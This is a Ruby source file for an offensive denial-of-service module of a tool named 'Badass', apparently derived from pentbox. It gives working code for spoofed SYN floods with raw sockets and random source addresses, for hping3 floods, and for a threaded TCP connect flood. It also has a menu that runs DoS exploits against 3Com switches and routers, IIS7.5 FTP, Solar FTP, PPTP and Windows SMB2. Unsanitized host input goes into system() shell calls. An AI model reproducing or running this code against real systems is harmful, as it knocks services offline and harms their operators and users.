#!/usr/bin/env ruby
###########################################################################
###########################################################################
##  Copyright The Resistance (C) 1995-2011                               ##
##  Author: blass                                                        ##
##  blass[at]sdf.lonestar.org @ twitter.com/Blass_o_rama                 ##
##  Badass 1.0                                                           ##
##  This file is part of Badass.                                         ##
##  Badass is free software: you can redistribute it and/or modify       ##
##  it under the terms of the GNU General Public License as published by ##
##  the Free Software Foundation, either version 3 of the License, or    ##
##  (at your option) any later version.                                  ##
##  Badass is distributed in the hope that it will be useful,            ##
##  but WITHOUT ANY WARRANTY; without even the implied warranty of       ##
##  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        ##
##  GNU General Public License for more details.                         ##
##  You should have received a copy of the GNU General Public License    ##
##  along with Badass. If not, see http://www.gnu.org/licenses/          ##
###########################################################################
###########################################################################
## This script was based on pentbox 1.4 and re-written by blass          ##
###########################################################################
###########################################################################
$text_color = true
dir = File.dirname(__FILE__)
require dir + "/lib/pb_proced_lib.rb"

module Network_pb
  class Net_dos_pb
    def initialize()

      require "socket"
      require "timeout"
      Dir.glob(File.join(File.dirname(__FILE__), '/dos_exploits/*.rb')).each { |e| require e } # DoS Exploits
      require File.dirname(__FILE__) + "/lib/racket/racket.rb"
      
      exploit_options = { "host" => false, "port" => false, "defport" => false, "user" => false, "pass" => false }
      system ("clear")      
      puts ""
      title " DOS Attack "
      puts ""
      title "    -==Attacks==-                                                             "
      title "                                                                              "
      title " 1- Spoofed SYN Flood Native (Raw Sockets, better, faster)                    " 
      title " 2- Spoofed SYN Flood hping3 (Must have installed hping3)                     "
      title " 3- TCP Flood                                                                 "
      title "                                                                              "
      title "    -==Exploits==-                                                            "
      title "                                                                              "
      title " 4- [other/http] 3Com SuperStack Switch DoS                                   "
      title " 5- [other/http] 3Com OfficeConnect Routers DoS (Content-Type)                "
      title " 6- [windows/ftp] Windows 7 IIS7.5 FTPSVC UNAUTH'D DoS                        "
      title " 7- [windows/ftp] Solar FTP Server 2.1 DoS                                    "
      title " 8- [windows/pptp] MS02-063 PPTP Malformed Control Data Kernel DoS            "
      title " 9- [windows/smb] Windows Vista/7 SMB2.0 Negotiate Protocol Request DoS BSOD  "
      title "                                                                             "
      puts ""
      warning "   Your Choice: "
      mode = gets_pb.chomp
      
      if mode.to_i > 3
        
	modeint = mode.to_i
	if modeint == 4
          exploit_options = tcom_ssswitch_dos_load(exploit_options)
	elsif modeint == 5
          exploit_options = tcom_oconn_dos_load(exploit_options)
	elsif modeint == 6
          exploit_options = iis7ftp_dos_load(exploit_options)
	elsif modeint == 7
          exploit_options = solarftp_dos_load(exploit_options)
	elsif modeint == 8
          exploit_options = mspptp_dos_load(exploit_options)
	elsif modeint == 9
          exploit_options = smb_dos_load(exploit_options)
	else
          puts ""
          warning " WTF?"
          puts ""
	end

	if exploit_options["host"] != false
          puts ""
          warning " Insert host to DOS"
          puts ""
          warning "   Your Choice: "
          exploit_options["host"] = gets_pb.chomp
	end
	if exploit_options["defport"] != false
          puts ""
          warning " Insert port (Default #{exploit_options['defport']})"
          puts ""
          warning "   Your Choice: "
          e_port = gets_pb.chomp
          if e_port != ""
            exploit_options["defport"] = e_port.to_i
          end
	end
	if exploit_options["port"] != false
          puts ""
          warning " Insert port"
          puts ""
          warning "   Your Choice: "
          exploit_options["port"] = gets_pb.chomp.to_i
	end
	if exploit_options["user"] != false
          puts ""
          warning " Insert username for connection."
          puts ""
          warning "   Your Choice: "
          exploit_options["user"] = gets_pb.chomp
	end
	if exploit_options["pass"] != false
          puts ""
          warning " Insert password for connection"
          puts ""
          warning "   Your Choice: "
          exploit_options["pass"] = gets_pb.chomp
	end
        
	puts ""
        
	if modeint == 4
          tcom_ssswitch_dos(exploit_options)
	elsif modeint == 5
          tcom_oconn_dos(exploit_options)
	elsif modeint == 6
          iis7ftp_dos(exploit_options)
	elsif modeint == 7
          solarftp_dos(exploit_options)
	elsif modeint == 8
          mspptp_dos(exploit_options)
	elsif modeint == 9
          smb_dos(exploit_options)
	end
      else
        
	puts ""
	warning " Insert host to DOS"
	puts ""
	warning "   Your Choice: "
	ip = gets_pb.chomp
	puts ""
	warning " Insert port to DoS."
	puts ""
	warning "   Your Choice: "
	port = gets_pb.chomp
        
	if mode == "1" || mode == "2"
          puts ""
          warning " Insert source address of the packets"
          warning " (press enter for random sources)."
          puts ""
          warning "   Your Choice: "
          source = gets_pb.chomp
          if source == ""
            randpackets = true
          else
            randpaquets = false
          end
	end
        
	puts ""
	spoofedsyn = 0
	if mode == "1"
          begin
            pack = Racket::Racket.new
            pack.l3 = Racket::L3::IPv4.new
            pack.l3.dst_ip = ip
            pack.l3.protocol = 6
            pack.l4 = Racket::L4::TCP.new
            pack.l4.src_port = rand(65535) + 1
            pack.l4.dst_port = port.to_i
            pack.l4.flag_syn = 1
            pack.l4.ack = 0
          rescue
            warning " Error building packet..."
            puts ""
            exit
          end
          if randpackets == true
            Thread.new do
              warning " [!] DoSing #{ip} on port #{port}"
              loop do
                sleep(1)
                STDOUT.flush
                warning "\r    Number of Spoofed SYN sent -> #{spoofedsyn.to_s} (rand src) "
              end
            end
            begin
              loop do
                pack.l3.src_ip = "#{rand(255).to_s}.#{rand(255).to_s}.#{rand(255).to_s}.#{rand(255).to_s}"
                pack.l3.ttl = 128
                pack.l4.window = rand(4096) + 1
                pack.l4.src_port = rand(65535) + 1
                pack.l4.seq = 0
                pack.l4.fix!(pack.l3.src_ip, pack.l3.dst_ip, '')
                pack.sendpacket
                spoofedsyn += 1
              end
            rescue
              puts ""
              warning " Error sending packets..."
              puts ""
              exit
            end
          else
            Thread.new do
              warning " [*] DoSing #{ip} on port #{port}"
              loop do
                sleep(1)
                STDOUT.flush
                warning "\r    Number of Spoofed SYN sent -> #{spoofedsyn.to_s} (#{source}) "
              end
            end
            begin
              loop do
                pack.l3.src_ip = source
                pack.l3.ttl = 128
                pack.l4.window = rand(4096) + 1
                pack.l4.src_port = rand(65535) + 1
                pack.l4.seq = 0
                pack.l4.fix!(pack.l3.src_ip, pack.l3.dst_ip, '')
                pack.sendpacket
                spoofedsyn += 1
              end
            rescue
              puts ""
              warning " Error sending packets..."
              puts ""
              exit
            end
          end
	elsif mode == "2"
          if randpackets == true
            loop do
              source = "#{rand(256).to_s}.#{rand(256).to_s}.#{rand(256).to_s}.#{rand(256).to_s}"
              spoofedsyn += 100
              system("clear")
              puts ""
              warning " DoSing #{ip} on port #{port}"
              warning " Number of Spoofed SYN sent -> #{spoofedsyn.to_s}"
              warning " ----------------- Source (#{source})"
              system(" hping3 -q -c 100 -i u1000 -S -a #{source} -p #{port} #{ip}")
            end
          else
            loop do
              spoofedsyn += 500
              system("clear")
              puts ""
              warning " DOSing #{ip} on port #{port}"
              warning " Number of Spoofed SYN sent -> #{spoofedsyn.to_s}"
              warning "----------------- Source (#{source})"
              system(" hping3 -q -c 500 -i u1000 -S -a #{source} -p #{port} #{ip}")
            end
          end
	elsif mode == "3"
          $number = 0
          $bytes = 0
          $kbytes = 0
          
          def tcp_attack(ip, port)
            Thread.new do
              loop do
                begin
                  # This number changes dramatically the power of the attack.
                  Timeout::timeout(0.00001) do
                    # Increases 2 because this code sends a SYN and then a RST (reset connection) packet,
                    # this is caused by the Timeout.
                    $number += 2
                    # KBytes per second.
                    # 74 bytes from the SYN and 54 from the RST.
                    $bytes += 74 + 54
                    $kbytes = $bytes/1024
                    socket = TCPSocket.new(ip, port)
                  end
                rescue Timeout::Error
                end
              end
            end
          end
          
          begin
            socket = TCPSocket.new(ip, port)
          rescue
          end
          
          if !socket
            warning " Closed/filtered port, or connection problem..."
            puts ""
          else
            socket.close
            20.times do
              tcp_attack(ip, port)
            end
            warning " [!] DoSing #{ip} on port #{port}"
            loop do
              STDOUT.flush
              warning "\r    Sent -> #{$number.to_s} - #{$kbytes.to_s} kB/s "
              $bytes = 0
              $kbytes = 0
              sleep(1)
            end
          end
	else
          system("clear")
	end
      end
      
    end
  end
end
